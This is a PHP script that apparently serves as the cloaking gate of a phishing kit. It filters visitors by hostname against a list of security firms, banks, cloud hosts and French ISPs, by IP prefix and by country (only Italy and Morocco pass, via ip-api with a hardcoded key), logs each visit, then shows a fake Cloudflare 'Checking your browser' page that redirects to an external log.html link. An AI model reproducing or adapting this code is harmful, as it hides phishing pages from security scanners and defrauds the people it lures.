<?php
session_start();

$black_list = [   
	"OVH",  "CompleTel", "Ozone", "Herault", "Supernet", "Interveille", "hosting", "VIALIS", "LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", "Commerciale",  "CRIHAN", "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT", "INFOMIL-CLTPARIS" , "NORDNET", "Technologies" , "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", "Interministerielle", "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", "Adista", "KEYYO", "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", "ALTSYSNET-OCCITANET5G", "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", "velia.net", "NATIXIS", "Electricite", "Hub", "Labs", "Lyre", "Serveurcom", "Rezopole", "Appliwave", "Epargne", "Anexia", "Caisse", "Sewan" , "Reunicable" , "Axione", "Scalair", "Colt", "epargne", "caisse", "Poste",  "Nerim", "Choopa", "SPIE", "Paritel", "Microsoft", "DATACENTER", "Layer", "ZSCALER", "Coaxis", "Firewall",  "Microsoft" , "RENATER" , "Online" , "Traitement" , "Dedicated" , "Owentis" , "Coriolis" , "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", "Holdings", "LLC", "NSC-SOLUTIONS", "Backbone", "DSL",  "VadeSecure", "Datacamp", "Momax", "Mutuel" , "FIMATEX" , "NEO", "Credit", "Agricole",  "PSINet", "Skylogic",  "Herault-networks" , "Alliance", "Connectic", "MYSTREAM", "Amazon", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele","YouSee"
];

$block_list = [ 
	"193.56.2" ,  "92.147.12.196" ,"194.78", "194.78.", "37.201.192.242", "79.166.147.44", "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30" , "194.206" , "185.", "176.149.93", "82.120.84" , "94.143.176" , "185.228.2", "176.148.157" , "193.57" , "89.210.43.74" ,"62.74.15.205"  , "2.10.4" , "92.184" , "109.221"
];

$allowed_countries = ['IT', '', 'MA'];

$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);

function generate_table_row($ip, $country, $isp, $status) {
    $color = in_array($status, ['Bot', 'Blocked Country', 'Blocked ISP', 'Blocked IP']) ? 'red' : 'green';
    $date = date('Y-m-d H:i:s');
    return "<span style='color:{$color};'>{$ip} - {$country} - {$isp} - {$status} - {$date}</span><br>\n";
}

function save_rs($rs) {
    $file_path = "log.htm";

    if (!file_exists($file_path)) {
        $rs = "<table>\n" . $rs . "</table>\n";
    }
    file_put_contents($file_path, $rs, FILE_APPEND);
}

foreach ($block_list as $blocked_ip) {
    if (strpos($ip, $blocked_ip) === 0) {
        $result = generate_table_row($ip, 'Blocked', '', 'Blocked IP');
        save_rs($result);
        exit('Afin ghadi aweld l9ahba ?');
    }
}

foreach ($black_list as $blocked_name) {
    if (stripos($hostname, $blocked_name) !== false) {
        $result = generate_table_row($ip, 'Blocked', '', 'Blocked ISP');
        save_rs($result);
        exit('Afin ghadi aweld l9ahba ?');
    }
}

$api_key = 'khrrBC6o2uXNXSp';
$api_url = 'https://pro.ip-api.com/json/';
$url = "{$api_url}{$ip}?key={$api_key}";

$query = json_decode(file_get_contents($url), true);

$country = $query['countryCode'];
$isp = $query['isp'];

if (!in_array($country, $allowed_countries)) {
    $result = generate_table_row($ip, $country, $isp, 'Blocked Country');
    save_rs($result);
    exit('Afin ghadi aweld l9ahba ?');
}

$links = [
    "https://ytzgrnqemk.cfolks.pl/ash/log.html",
    "https://ytzgrnqemk.cfolks.pl/ash/log.html", 
];

$random_link = $links[array_rand($links)];

$result = generate_table_row($ip, $country, $isp, 'User');
save_rs($result);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f7f7f7;
        }

        .container {
            text-align: center;
        }

        #cf-bubbles {
            display: inline-block;
            margin-bottom: 20px;
        }

        .bubbles {
            display: inline-block;
            width: 20px;
            height: 20px;
            margin: 2px;
            background-color: #f4a15d;
            border-radius: 100%;
            animation: fader 1.6s infinite;
        }

        #cf-bubbles>.bubbles:nth-child(2) {
            animation-delay: .2s;
        }

        #cf-bubbles>.bubbles:nth-child(3) {
            animation-delay: .4s;
        }

        @keyframes fader {
            0%, 100% {
                opacity: 0;
            }

            50% {
                opacity: 1;
            }
        }

        h1 {
            font-size: 24px;
            color: #333;
        }

        p {
            color: #666;
        }
		
		.footer {
            font-size: 12px;
            color: #999;
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="container">
        <div id="cf-bubbles">
            <div class="bubbles"></div>
            <div class="bubbles"></div>
            <div class="bubbles"></div>
        </div>
        <h1>Checking your browser before accessing</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p>Please wait a few seconds...</p>
    </div>
	<div class="footer">
        Protection DDoS par <span style="color: skyblue; text-decoration: underline;">Cloudflare</span><br>
        Ray ID : unique_id(52456378924)
    </div>
    <script>
        setTimeout(function () {
            window.location.href = "<?php echo $random_link; ?>";
        }, 500);
    </script>
</body>

</html>